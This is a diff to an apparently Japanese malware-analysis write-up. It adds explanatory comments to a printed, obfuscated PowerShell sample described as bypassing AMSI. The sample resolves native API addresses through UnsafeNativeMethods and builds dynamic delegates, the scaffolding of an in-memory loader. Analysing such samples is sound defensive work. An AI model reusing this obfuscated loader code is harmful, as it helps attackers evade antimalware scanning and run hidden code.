@@ -124,12 +124,14 @@ AMSIをバイバスるるためにPowershellが実行される
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
     Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
+
 # [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされているかどうか「Equals」メソッドで確認
 # ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「GetType」メソッドで確認
     $IObr8mVbBcalgmD = ([AppDomain]::CurrentDomain.GetAssemblies() |
     WheRe-ObJecT { 
         $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
      }).GetType("Microsoft."+[cHar]([BYTE] 0xae-0x57)+[cHaR](5622-5517)+[ChaR](8858-8748)+[chaR]([byTe] 0x56-0x23)+[chAR](1248-1198)+[ChaR](877-831)+[CHAR](4158-4073)+[ChaR](4512-4402)+"safeNativeMethods")
+
 # 「GetMethods()」メソッドでsystem.dllの「GetProcAddress」を取得
     $IqnMnVucT=@()
     $IObr8mVbBcalgmD.GetMethods() | FOrEaCH-ObJEct {
@@ -137,6 +139,7 @@ FUncTIon Get-PZ2zmpurexnDXVSxx {
             $IqnMnVucT+=$_
         }
     }
+
 #「GetMethods()」メソッドで System.dllの「GetModuleHandle」を取得し、「GetModuleHandle.Invoke($null,引数DLL名)」を実行し引数DLLのハンドルを取得
 # System.dllの「GetProcAddress」で、引数DLLの引数プロセス名のアドレスを取得
     return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))
@@ -148,6 +151,7 @@ FUncTIon Get-iy2kysa7yS {
     Param (
      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jqr21eiEq5PCPuo, [Parameter(Position = 1)] [Type] $zjYqpHs8RLAoDPo = [Void]
     )
+
 # [AppDomain]::CurrentDomain.DefineDynamicAssemblyで「動的アセンブリの一意のID」と「アクセスモード」を指定して、動的アセンブリを定義
 # 動的アセンブリの一意のIDは、[System.Reflection.AssemblyName]で「ReflectedDelegate」という名前を指定
 # アクセスモードは、[System.Reflection.Emit.AssemblyBuilderAccess]::Runを指定（Runは動的アセンブリは実行されるが保存されない）
@@ -179,7 +183,9 @@ FUncTIon Get-iy2kysa7yS {
         $zjYqpHs8RLAoDPo,
         $jqr21eiEq5PCPuo
     ).SetImplementationFlags("Runtime, Managed")
-    
+
+# System.Reflection.Emit.ModuleBuilder.DefineType()メソッドの戻り値は「System.Reflection.Emit.TypeBuilder」クラス
+# TypeBuilderクラスのCreateType()メソッドで、オブジェクトを作成
     return $WQvsFMfB0c.CreateTYpe()
 }
 #jump
